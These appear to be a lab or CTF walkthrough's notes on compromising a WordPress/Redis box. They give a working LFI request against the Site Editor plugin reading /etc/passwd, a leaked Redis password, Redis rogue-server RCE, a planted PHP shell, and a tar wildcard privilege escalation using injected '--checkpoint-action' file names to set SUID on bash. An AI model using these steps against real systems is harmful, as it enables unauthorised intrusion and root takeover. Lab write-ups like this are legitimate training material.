### ++ Approach 192.168.205.166 ++
#### Credentials
	* root
    * alice
    * no username:Ready4Redis? (Redis)

#### Services
	##### 22 SSH
		- 

	##### 80 Http
		Wordpress 5.7.2
            Plugin Site Editor 1.1.1 - LFI Exploitable

	##### 6379 Redis
		Need credentials
        With LFI we can read redis config file /etc/redis/redis.conf
        Access with: 
            redis-cli -h 192.168.205.166
            AUTH Ready4Redis?
        With redis-rogue-server (https://github.com/n0b0dyCN/redis-rogue-server) we can get RCE
            Try placing php file in wordpress folder

### ++ Vulnerabilities ++

#### Vuln 1: LFI in Wordpress Plugin Site Editor 1.1.1 ++
	Exploit: https://www.exploit-db.com/exploits/44340 
    http://192.168.205.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd

### ++ System Interaction ++
#### Foothold as redis
	* With LFI we can get redis credentials (in /etc/redis/redis.conf file) and redis server version is 5.0.14 (we can see this with redis-cli, command 'info'), so we can use redis-rogue-server to get a shell: https://github.com/n0b0dyCN/redis-rogue-server

#### Lateral movement as alice 
    * With redis we check writable folders (find / -writable -type d 2>/dev/null). We try to place a php shell in tmp folder but it doesn't get executed, then we tried in /run/redis and it works perfectly so we get RCE as alice through LFI vulnerability

#### Privilege Escalation 
	* We found a cronjob for user root which is launching the script /usr/local/bin/backup.sh.
        Content:
            #!/bin/bash
            cd /var/www/html
            if [ $(find . -type f -mmin -3 | wc -l) -gt 0 ]; then
            tar -cf /opt/backups/website.tar *
            fi
        Explanation: Check for files modified in the last 3 minutes and create a file called website.tar with all the content if something was modified
        Exploitation: Tar wildcard (https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks)
            In /var/www/html:
                echo -e '#/!bin/bash\nchmod +s /bin/bash' > shell.sh
                echo "" > "--checkpoint-action=exec=sh shell.sh"
                echo "" > "--checkpoint=1"
            Wait for the script to be executed and then:
                /bin/bash -p (Execute binary as owner, which is root)